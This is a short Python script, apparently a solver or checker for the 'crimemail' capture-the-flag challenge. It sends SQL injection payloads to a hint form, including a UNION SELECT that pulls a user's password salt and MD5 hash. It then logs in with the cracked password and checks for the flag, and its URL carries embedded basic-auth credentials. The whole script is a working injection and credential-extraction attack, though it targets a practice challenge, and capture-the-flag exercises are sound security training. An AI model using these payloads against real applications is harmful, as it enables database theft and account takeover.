#!/usr/bin/python3
import requests

url = "https://insecurity:LTjdgKjKSiHswkf0iOEl@crimemail.ctf.insecurity-insa.fr"
session = requests.Session()

data = {
    "username": "user' or 1=1 -- s",
}
r = session.post(url + "/hint.php", data=data)

assert "I don't need any hints man!" in r.text

data = {
    "username": "user' union SELECT CONCAT(pass_salt, ',', pass_md5) FROM users WHERE userID=4 -- s",
}
r = session.post(url + "/hint.php", data=data)

assert "YbEr,fe3437f0308c444f0b536841131f5274" in r.text


data = {
    "username": "c.hackle",
    "password": "pizza",
}
r = session.post(url + "/auth.php", data=data)

res = session.get(url + "/emails.php").text
assert("INSA{s3cr3t_l0cat10n}" in res)

print("OK!")
